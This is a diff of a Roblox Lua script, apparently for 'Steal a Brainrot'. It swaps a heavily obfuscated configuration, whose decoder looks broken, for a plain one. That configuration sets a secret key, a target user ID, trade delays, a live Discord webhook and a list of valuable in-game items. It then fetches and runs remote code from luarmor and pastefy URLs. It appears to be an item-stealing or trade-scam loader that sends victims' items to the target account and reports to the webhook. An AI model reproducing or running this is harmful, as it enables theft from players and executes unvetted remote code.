@@ -1,56 +1,107 @@
---[[ Obfuscated with Prometheus-style engine ]]
-local _IOII0IlI="_IIIOI0";local _I0Ol0O0l="_0lIllO";local _I0Ol00ll="_l00lIl";local _0IlI0I00="_0IO0O0";local _OIIOOI0I="_OI00Ol";
-local _OOIIOIIlIOI0O0lO=(function(_l0OOII)return function(...)local _0IIlll=""for _,_000Il0 in ipairs({...})do _OllO0l=_l00OOI..string.char(bit32 and bit32.bxor(_IllI0O,_II0Ol0)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_l0Il0l,_IOOO0I))end return _ll0lOl end end)(219);
-local _OIOl00IOOl0O=function()
-getgenv().User = _OOIIOIIlIOI0O0lO(136,147,154,142,137,130,154,132,139,151,154,130,129,234,235,234)
-
-getgenv().Webhook = _OOIIOIIlIOI0O0lO(179,175,175,171,168,225,244,244,191,178,168,184,180,169,191,245,184,180,182,244,186,171,178,244,172,190,185,179,180,180,176,168,244,234,239,236,226,238,238,235,227,235,235,238,232,235,232,236,239,236,237,226,244,161,141,173,227,180,185,184,172,176,141,136,140,171,235,138,191,137,183,180,173,138,235,171,156,227,142,191,146,233,178,144,143,151,141,178,147,139,168,168,185,238,152,172,237,183,130,144,157,142,156,162,232,154,173,184,172,139,171,175,159,237,132,183,154,181,162,144,169)
-
-getgenv().SecretToken = _OOIIOIIlIOI0O0lO(233,189,235,236,233,237,234,234,246,185,185,239,186,246,239,189,184,189,246,185,233,185,186,246,190,191,237,238,189,186,227,236,227,191,239,185)
-
-getgenv().Brainrots = {
-  _OOIIOIIlIOI0O0lO(156,186,169,186,182,186,251,186,181,191,251,150,186,191,174,181,191,174,181,188),
-  _OOIIOIIlIOI0O0lO(144,190,175,184,179,174,169,174,251,186,181,191,251,150,174,168,175,174,169,174),
-  _OOIIOIIlIOI0O0lO(151,186,173,186,191,180,169,178,175,180,251,136,171,178,181,178,175,180),
-  _OOIIOIIlIOI0O0lO(144,190,175,174,171,186,175,251,153,169,180,168),
-  _OOIIOIIlIOI0O0lO(144,190,175,174,171,186,175,251,144,190,171,186,175),
-  _OOIIOIIlIOI0O0lO(143,186,181,188,251,143,186,181,188,251,144,190,183,190,175,186,181,188),
-  _OOIIOIIlIOI0O0lO(136,175,169,186,172,185,190,169,169,162,251,158,183,190,171,179,186,181,175),
-  _OOIIOIIlIOI0O0lO(159,169,186,188,180,181,251,156,178,181,188,190,169,178,181,178),
-  _OOIIOIIlIOI0O0lO(147,162,191,169,186,251,159,169,186,188,180,181,251,152,186,181,181,190,183,183,180,181,178),
-  _OOIIOIIlIOI0O0lO(136,176,178,185,178,191,178,251,143,180,178,183,190,175),
-  _OOIIOIIlIOI0O0lO(147,190,186,191,183,190,168,168,251,147,180,169,168,190,182,186,181),
-  _OOIIOIIlIOI0O0lO(150,190,180,172,183),
-  _OOIIOIIlIOI0O0lO(159,169,186,188,180,181,251,152,186,181,181,190,183,183,180,181,178),
-  _OOIIOIIlIOI0O0lO(151,180,173,190,251,151,180,173,190,251,153,190,186,169),
-  _OOIIOIIlIOI0O0lO(151,186,251,136,174,171,169,190,182,190,251,152,180,182,185,178,181,186,168,178,180,181),
-  _OOIIOIIlIOI0O0lO(152,190,183,190,168,175,178,186,183,251,139,190,188,186,168,174,168),
-  _OOIIOIIlIOI0O0lO(139,180,171,184,174,169,174,251,186,181,191,251,157,178,161,161,174,169,174),
-  _OOIIOIIlIOI0O0lO(137,180,168,190,162,251,186,181,191,251,143,190,191,191,162),
-  _OOIIOIIlIOI0O0lO(152,186,171,178,175,186,181,180,251,150,180,185,162),
-  _OOIIOIIlIOI0O0lO(152,180,180,176,178,251,186,181,191,251,150,178,183,176,178),
-  _OOIIOIIlIOI0O0lO(153,174,169,188,174,169,180,251,154,181,191,251,157,169,162,174,169,180),
-  _OOIIOIIlIOI0O0lO(137,190,178,181,178,175,180,251,136,183,190,178,188,179,178,175,180),
-  _OOIIOIIlIOI0O0lO(151,180,168,251,154,182,178,188,180,168),
-  _OOIIOIIlIOI0O0lO(151,186,251,136,190,184,169,190,175,251,152,180,182,185,178,181,186,168,178,180,181),
-  _OOIIOIIlIOI0O0lO(151,180,168,251,136,190,176,180,183,186,179,168),
-  _OOIIOIIlIOI0O0lO(136,178,188,181,180,169,190,251,152,186,169,186,171,186,184,190),
-  _OOIIOIIlIOI0O0lO(157,169,186,188,169,186,182,186,251,186,181,191,251,152,179,180,184,169,186,182,186),
-  _OOIIOIIlIOI0O0lO(151,186,251,152,186,168,186,251,153,180,180),
-  _OOIIOIIlIOI0O0lO(151,186,251,157,180,180,191,251,152,180,182,185,178,181,186,168,178,180,181),
-  _OOIIOIIlIOI0O0lO(136,171,180,180,176,162,251,186,181,191,251,139,174,182,171,176,162),
-  _OOIIOIIlIOI0O0lO(151,186,251,156,178,181,188,190,169,251,136,190,176,180,183,186,179),
-  _OOIIOIIlIOI0O0lO(156,178,181,188,190,169,251,156,190,169,186,175),
-  _OOIIOIIlIOI0O0lO(136,186,182,182,162,181,178,251,157,186,175,175,178,181,178)
+getgenv().SECRET_KEY = "mrr_5ad2ab58b3434768bf9f0ce801d95031"
+getgenv().TARGET_ID = 2204996914
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479550800530374769/zVv8obcwkVSWp0QdRlovQ0pG8UdI2iKTLViHPssb5Cw6lYKFUGy3AvcwPptD6_lAnyKr"
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Tuff Toucan"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Festive 67"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Guest 666"] = true,
+    ["Swag Soda"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Los Bros"] = true,
+    ["Tralaledon"] = true,
+    ["Los Puggies"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Ginger Gerat"] = true,
+    ["Love Love Bear"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["25"] = true,
+    ["Los Sweethearts"] = true,
+    ["Las Sis"] = true,
+    ["Los Planitos"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Candies"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Los 25"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Mi Gatito"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Rang Ring Bus"] = true,
+    ["Los Burritos"] = true,
+    ["Arcadopus"] = true,
+    ["Burrito Bandito"] = true,
+    ["Los Quesadillas"] = true,
+    ["1x1x1x1"] = true,
+    ["Los Mi Gatitos"] = true,
+    ["Yess my examine"] = true,
+    ["Noo my examine"] = true,
+    ["Esok Sekolah"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Los 67"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Amigos"] = true,
+    ["Los Combinasionas"] = true,
+    ["Lovin Rose"] = true
 }
-
 task.spawn(function()
-loadstring(game:HttpGet(_OOIIOIIlIOI0O0lO(179,175,175,171,168,225,244,244,186,171,178,245,183,174,186,169,182,180,169,245,181,190,175,244,189,178,183,190,168,244,173,239,244,183,180,186,191,190,169,168,244,227,235,227,189,239,186,191,239,190,185,189,189,239,236,238,184,238,236,184,190,237,234,190,186,232,226,190,239,234,190,233,232,245,183,174,186)))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
-
 task.spawn(function()
-loadstring(game:HttpGet(_OOIIOIIlIOI0O0lO(179,175,175,171,168,225,244,244,171,186,168,175,190,189,162,245,186,171,171,244,145,144,140,177,227,156,130,154,244,169,186,172)))()
+loadstring(game:HttpGet("https://pastefy.app/JKWj8GYA/raw"))()
 end)
-
-end;
-local _,_IOlOllOO=pcall(_OIOl00IOOl0O);if _lIl00IlI then _OIOl00IOOl0O()end;
